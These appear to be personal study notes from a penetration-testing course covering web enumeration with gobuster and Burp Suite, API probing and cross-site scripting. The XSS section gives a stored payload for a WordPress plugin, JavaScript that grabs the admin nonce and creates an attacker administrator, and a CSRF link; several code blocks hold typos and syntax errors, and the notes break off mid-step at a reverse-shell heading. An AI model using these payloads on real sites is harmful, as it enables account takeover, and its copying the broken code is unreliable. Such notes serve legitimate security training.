This learning module contains:

1.  Web application assessment methodology;
2.  Web application enumeration; and
3.  Cross-site scripting.

## Web application assessment methodology
This learning module contains;

1.  Understand web application security testing requirements;
2.  Learn different types of methodologies of web application testing; and 
3. Learn about the OWASP top 10 and most common web vulnerabilities.

There are generally speaking 3 different types of web application testing methodologies: white-box; black-box and grey-box.

With white-box testing, the customer (application owner) provides access to the application, source code, and infrastructure.  The pen test focuses on application logic and source code review.

Black-box review is essentially the opposite, where  the pen tester is not provided any details at all.  This is how bug bounty programs operate.

Grey-box is somewhere in the middle, with some details provided.
## Web application assessment tools
We will use several tools in web application enumeration, including NMAP, Wappalyzer, GoBuster and BurpSuite proxy.
### NMAP
NMAP stand scanning techniques can be used to identify OS, application services and versions as well as vulnerabilities.
### Wappalyzer
Wappalyzer is a free and paid product which is used to identify the tech stack of any web application.
### GoBuster
GoBuster is a directory brute-forcing application that is used to identify the directory structure of web applications.  It is frequently used with 'word-lists'.

~~~ bash
# GoBuster brute-forcing with word-lists.
# the dir parameter is for searching for directories

gobuster dir -u <IP> -w /usr/share/wordlists/dirb/common.txt 

~~~
### Burp-suite
Burp-suite is a GUI based integrated platform for web application security testing.  There is a community based version that is used for manual testing and the commercial version has considerably more functions.

Burp-suite requires that a proxy is configured to capture and modify if required.  There is a built-in proxy and it can be configured with 3rd party plugins like [Foxy Proxy](https://getfoxyproxy.com).  

The steps to configure the internal proxy server are as follows:

1.  Select the 'proxy' tab;
2.  Disable the 'intercept' option;
3.  Select the 'proxy settings' option;
4.  By default burp suite listens on localhost:8080;
5.  Firefox needs to be configured.  Add 'about:preference#general'.  At the bottom of the  page select the 'settings' option.
6.  Select the 'manual' and the 'also use this proxy for https';
7.  Set the 'HTTP' proxy to '127.0.0.1:8080'; and
8.  Select 'Ok';

With the proxy configured the http data will be captured by Burp-suite.  We can now see both the request and response details.
#### Intruder
The 'Intruder' tool within Burpe-suite is used to automate a variety of attack methods.  It can be used to undertake a simple brute-force attack.

Configure the proxy server as usual so that it captures web traffic as normal.  When a password is submitted via 'Wordpress' site a POST request is used.  From within the the http-history tab and right click on the post item and 'send to intruder'.

Intruder can then be used to manipulate the 'password' component of the POST request.
## Web application enumeration
### Learning objectives
1.  Learn how to debug web applications;
2. Understand how to enumerate and inspect headers, cookies and source code; and
3. Learn how to conduct API testing methodologies.

It is important to utilise passive enumeration techniques initially to discover the implemented technology stack.  Generally, this consists of:
1.  Host Operating System (OS);
2. Web server software;
3. Database software; and
4. Front and back-end programming.

It is worthwhile to note that many web applications are implemented using off the shelf frameworks and bundles.  Common examples of this include:
1.  Flask;
2. Django;
3. Wordpress; and
4. Drupal.

It is important to identify the components of a web application before attempting to blindly exploit it.  Many web application vulnerabilities are technology agnostic, however, others need to be carefully configured for a specific target.

### Inspect HTTP response headers and site maps
The robots.txt contains the pages which bots can and cannot access.  They are relevant for search engines.  Robots.txt includes both allow and disallow directives, which instructs web crawlers and search engines which pages should and shouldn't indexed.  This can be ignored.  

~~~ bash
# this obtains the robots.txt for google.com

curl https://google.com/robots.txt

~~~

### Enumerating and abusing APIs
API are essentially access points to functions and data, which are built and deployed for machine to machine integration.

~~~ bash
# api are accessed with the following structure

https://api_name/v1/

~~~

Conventional tools like 'gobuster' can be used to identify API endpoints, which includes a 'pattern' function (-p). 

~~~ bash
# using the Gobuster pattern function
# pattern.txt contains the structure of the pattern we are going to bruteforce.
# {GOBUSTER}/v1
# {GOBUSTER}/v2

gobuster dir -u <IP> -w /usr/share/wordlists/dirb/big.txt -p pattern.txt

# this returns results that follow this function

/books/v1
/users/v1

~~~

We can inspect the API by using the curl function:

~~~ bash

# the '-i' parameter includes the http headers in the response
curl -i https://<IP>/users/v1

# this can return a list of users which can be brute-forced
# it returns several usernames including 'admin'

# with this additional username information known, we can try to breute-force the username component of the api

gobuster dir -u https://<IP>/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt

# this returns additional api information, including 'email' and 'password'

curl -i https://<IP>/users/v1/admin/password

# this results in a '405 method not allowed'.  This suggests that the endpoint exists.  By default, the curl command uses the 'GET' method (which is not allowed).  

~~~
## Steps
Fix this
1.  Scan the target with gobuster using a api pattern
2.  Enumerate users by sending commands to the API endpoint - user/v1
3.  With a known users scan the user endpoint with gobuster - user/v1/admin
4.  Call the password endpoint
### Cross site scripting
Data sanitization is a process in which user input is processed to remove all dangerous characters and strings.  This prevents users from injecting and potentially execute malicious code.

Cross-site scripting (XSS) is a vulnerability that exploits a users trust in a website by dynamically injecting content into the page rendered by the users browser.  XSS is considered high risk and prevalent.

There are two main categories of XSS, 'stored' and 'reflected'.  
#### Stored XSS
Stored XSS attacks, which are also know as 'persistent XSS' occur when the exploit payload is stored in a database or otherwise cached by the server.  A single stored XSS vulnerability can therefore attack all site users.

Reflected XSS attacks usually include the payload in a crafted request or link.  The web application takes this value and places into the page content.  This XSS variant only attacks the person submitting the request or visiting the link.  Reflected XSS vulnerabilities can often occur in search fields and results, as well as anywhere user input is included in error messages.

Either of these two vulnerabilities can manifest as client (browser) or server-side;  the can also be DOM based.

DOM-based XSS takes place solely within the DOM.  

The different types of XSS are differentiated by how the payload is delivered and executed.  All XSS vulnerabilities are run under the context of the user visiting the affected page.  This means that the users browser not the web application executes the XSS payload. 

When a browser processes a servers HTTP response containing HTML, the browser creates a DOM tree and renders it.  The DOM is comprised of all forms, inputs, images e.t.c. related to the web page.  
#### Java-script refresher
Java-scripts role is to access and modify the DOM, resulting in a more interactive web user experience.  Fro an attackers perspective, this means that if we can inject java-script code into the application, we can access and modify the page's DOM.  With access to the DOM, we can redirect login forms, extract passwords and steal session cookies.

~~~ js
function multiplyValues(x,y) {
	return x * y;
}

let a = multiplyValues(3,5)
console.log(a)

~~~
#### Identifying XSS vulnerabilities
We can find potential entry points for XSS by examining a web application and identifying input fields (such as search fields) that accept unsanitised input, which is then displayed as output in subsequent pages.

Once we identify an entry point, we can input special characters and observe the output to determine if any special characters return unfiltered.  

~~~ bash
# the most common special characters are

< > ' " { } ;

~~~
#### Basic XSS
In this example we will exploit a known vulnerability in a Wordpress plugin called 'visitors'.  The plugins main feature is to log the websites visitor data, including the IP, source and User-Agent fields.  The source code for the plugin can be downloaded from its website.  If we inspect the database.php file, we verify how the data is stored inside the Wordpress database.

~~~ php

function VST_save_record() {
	global $wpdb;
	$table_name = $wpdb->prefix . 'VST_registros';

	VST_create_table_records();

	return $wpdb->insert(
				$table_name,
				array(
					'patch' => $_SERVER["REQUEST_URI"],
					'datetime' => current_time( 'mysql' ),
					'useragent' => $_SERVER['HTTP_USER_AGENT'],
					'ip' => $_SERVER['HTTP_X_FORWARDED_FOR']
				)
			);
}
~~~

In this example 'burp-suite proxy' captures HTTP requests.  These WordPress Visitors plugin captures the 'HTTP User-Agent' data and stores it in the WordPress database.  When the admin reloads the Visitors plugin the start.php code block will run.

Using the 'Burp-suite' repeater function, we can modify the data in the 'User-Agent' field with the code that we want to run.  In this case we will inject the following code:

~~~ js

User-Agent:<script>alert(42)</script>

~~~

Rather than recording this data, it runs the arbitrary code and displays the message block on the sites page. 
#### Session cookies
With XSS we can steal session cookies and session information if the application uses and insecure session management configuration.  If we can steal an authenticated users session cookie we can masquerade as that user within the target web site.  
Websites use cookies to track state and information about users.  Cookies can be set with several optional flags, including two that are particularly interesting to us as pen tester:  Secure and HTTPOnly.

The secure flag instructs the browser to only send the cookie over encrypted connections, such as HTTPS.  This protects the cookie from being send in clear text and captured over the network.

The HTTPOnly flag instructs the browser to deny JavaScript access to the cookie.  If this flag is not set, we can use an XSS payload to steal the cookie.
#### Privilege Escalation
By injecting some JavaScript in the 'User-Agent' HTTP header, which is then run when the WordPress Administrator reloads the plugin the JavaScript is executed.  Because this code is executed by an Administrator, we can use this to inject JavaScript code that creates a new user.  Essentially, code is injected into a WordPress database which also stores information of the relevant plugin.  When the administrator reloads the plugin, the injected code executes, by default with administrative privileges. 

This new attack angle which is to fetch the WordPress admin nonce.  The nonce is a server generated token that is included in the HTTP request to add randomness and prevent Cross-Site-Request-Forgery attacks (CSRF).  A CSRF attack occurs via social engineering in which the victim clicks on a malicious link that performs a preconfigured action on behalf of the user.  
The malicious link could be disguised by an apparently-harmless description, often luring the victim to click on it.

~~~ html

<a href="http://fakecryptonbank.com/send_btc?account=ATTACKER&amount=1000000"">Check out these awesome cat memes!</a>

																			  ~~~

In order to use an exploit above, we need to obtain the WordPress nonce.

~~~ js

// using JS to obtain the WordPress nonce.

var ajaxRequest = new XMLHttpRequest();
var requestURL = /wp-admin/user-new.php;
var nonceRegex = /ser" value="([^"]*?)"/g;
ajexRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responceText);
var nonce = nonceMatch[1];

~~~

Now that we have the WP nonce we can craft the main function responsible for creating the new admin users.

~~~ js

// creating the new wordpress admin user

var params = "action=createuser&_wpnonce_create-user="+nonce+"& user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest =  new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type)", "application/x-www-form-urlencoded");
ajaxRequest.send(params);

~~~

Finally we need to encode the minified JavaScript code, so any bad characters wont interfere with sending the payload.  We can do this using the following function.

~~~ js

function encode_to_javascript(string){
	var input = string;
	var output = '';
	for(pos = 0, pos < input.length; pos++); {
		output += input.charCodeAt(pos);
		if(pos != (input.length -1)) {
			output += ",";
		}
	} 
	return output:
	}
let encode = encode_to_javascript('insert_minified_javascript')
console.log(encoded)
~~~

### OS Command Injection
Web applications frequently need to interact with the underlying OS to undertake routine tasks like interacting with the file system.  Web applications should provide a specific API with prepared commands to interact with the OS which cannot be changed by user input.  These however are time consuming to create and maintain.  
Frequently, developers rely on user input and then sanitise.  This means that user input is filtered cor any command sequences that might try to change the application's behavior.
#### Creating a Windows reverse shell with Powercat
1.  Copy 'Powercat' to the working directory;
2. Start a Python 3 http server in the same directory; and
3. S
## Tags
#enumeration
#nmap 
#burpsuite
#Wappalyzer
#gobuster
#foxyproxy
#firefoxproxy
#intruder





